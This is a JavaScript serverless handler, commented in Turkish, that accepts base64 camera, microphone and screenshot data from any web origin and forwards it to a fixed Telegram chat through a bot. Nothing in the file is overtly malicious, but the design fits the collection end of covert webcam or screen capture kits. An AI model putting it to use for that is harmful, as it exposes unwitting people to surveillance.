// 📤 Telegram File Upload API
// Bu fonksiyon kamera/mikrofon kayıtlarını Telegram'a gönderir

const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed. Use POST.' });
    }

    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            return res.status(500).json({ success: false, error: 'Server configuration error' });
        }

        const { file_type, file_data, caption, message_id } = req.body;

        if (!file_type || !file_data) {
            return res.status(400).json({ success: false, error: 'Missing file_type or file_data' });
        }

        // Base64'ten Buffer'a çevir
        const base64Data = file_data.split(',')[1] || file_data;
        const buffer = Buffer.from(base64Data, 'base64');

        // Dosya tipine göre Telegram API endpoint'ini belirle
        let telegramEndpoint;
        let formFieldName;
        let filename;

        switch (file_type) {
            case 'photo':
                telegramEndpoint = 'sendPhoto';
                formFieldName = 'photo';
                filename = `screenshot_${Date.now()}.jpg`;
                break;
            case 'video':
                telegramEndpoint = 'sendVideo';
                formFieldName = 'video';
                filename = `video_${Date.now()}.webm`;
                break;
            case 'voice':
                telegramEndpoint = 'sendVoice';
                formFieldName = 'voice';
                filename = `voice_${Date.now()}.ogg`;
                break;
            default:
                return res.status(400).json({ success: false, error: 'Invalid file_type' });
        }

        // FormData oluştur
        const FormData = (await import('form-data')).default;
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append(formFieldName, buffer, { filename: filename });
        
        if (caption) {
            form.append('caption', caption);
        }

        if (message_id) {
            form.append('reply_to_message_id', message_id);
        }

        // Telegram'a gönder
        const telegramUrl = `${TELEGRAM_API_URL}${botToken}/${telegramEndpoint}`;
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            body: form,
            headers: form.getHeaders()
        });

        const telegramData = await telegramResponse.json();

        if (!telegramData.ok) {
            console.error('Telegram API error:', telegramData);
            return res.status(500).json({
                success: false,
                error: 'Failed to send file to Telegram',
                details: telegramData.description
            });
        }

        return res.status(200).json({
            success: true,
            message: 'File sent successfully',
            telegram_message_id: telegramData.result.message_id
        });

    } catch (error) {
        console.error('Error in send-file:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error',
            message: error.message
        });
    }
}

